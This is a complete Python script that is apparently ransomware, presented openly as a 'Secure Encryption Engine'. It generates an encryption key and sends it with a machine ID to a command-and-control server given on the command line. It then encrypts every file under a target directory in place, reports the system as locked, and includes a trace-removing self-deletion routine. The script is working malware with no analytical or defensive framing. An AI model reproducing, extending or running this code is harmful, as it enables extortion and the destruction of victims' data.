import os, uuid, time, argparse, requests, urllib3
from pathlib import Path
from cryptography.fernet import Fernet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EncryptionEngine:
    def __init__(self, server_url, target_dir):
        self.server_url = server_url.rstrip('/')
        self.target_dir = Path(target_dir).resolve()
        self.machine_id = self._generate_machine_id()
        self.key = None
        self.fernet = None
        self.excluded_files = {"encrypt.py"}

    def _generate_machine_id(self):
        return str(uuid.getnode())

    def _generate_key(self):
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        return self.key

    def _exfiltrate_key(self):
        print(f"[*] Registering Machine ID: {self.machine_id}...")
        
        payload = {
            "machine_id": self.machine_id,
            "key": self.key.decode('utf-8') if isinstance(self.key, bytes) else self.key
        }

        try:
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "SecureEngine/1.0",
                "localtonet-skip-warning": "true"
            }

            print(f"[*] Attempting connection to: {self.server_url}/register")
            
            response = requests.post(
                f"{self.server_url}/register", 
                json=payload, 
                headers=headers,
                verify=False, 
                timeout=20
            )
            
            if "application/json" in response.headers.get('Content-Type', ''):
                if response.status_code == 200:
                    print("[+] Key successfully registered with server.")
                    return True
                else:
                    print(f"[!] Server error: {response.status_code} - {response.text}")
                    return False
            else:
                print("[!] Error: Received non-JSON response.")
                print(f"[*] Response Preview: {response.text[:80]}...")
                return False

        except Exception as e:
            print(f"[!] Connection to C2 failed: {e}")
            return False

    def _encrypt_file(self, file_path):
        try:
            temp_file = file_path.with_suffix(file_path.suffix + ".tmp")

            with open(file_path, "rb") as rf:
                content = rf.read()

            encrypted_content = self.fernet.encrypt(content)

            with open(temp_file, "wb") as wf:
                wf.write(encrypted_content)

            os.replace(temp_file, file_path)
            print(f"[+] Encrypted: {file_path.name}")
        except Exception as e:
            print(f"[-] Error encrypting {file_path.name}: {e}")
            if os.path.exists(temp_file):
                os.remove(temp_file)

    def start_encryption_process(self):
        print(f"[*] Initializing system for Machine: {self.machine_id}")
        
        self._generate_key()

        if not self._exfiltrate_key():
            print("[!] Critical Error: Could not secure key. Aborting.")
            return

        print(f"[*] Starting encryption in: {self.target_dir}")
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if file in self.excluded_files or file.endswith(".tmp"):
                    continue
                
                file_path = Path(root) / file
                self._encrypt_file(file_path)

        print("\n[🕱] All files processed. System locked.")
        # self._self_destruct()

    def _self_destruct(self):
        """Cleanup traces."""
        print("[*] Cleaning up traces...")
        time.sleep(2)
        try:
            script_path = Path(__file__).resolve()
            os.remove(script_path)
        except Exception as e:
            print(f"[!] Cleanup failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Secure Encryption Engine")
    parser.add_argument("--server", required=True, help="C2 Server URL")
    parser.add_argument("--path", required=True, help="Target Directory")
    args = parser.parse_args()

    for i in range(3, 0, -1):
        print(f"[!] Starting in {i} seconds...", end="\r")
        time.sleep(1)
    print("\n")

    engine = EncryptionEngine(args.server, args.path)
    engine.start_encryption_process()

if __name__ == "__main__":
    main()

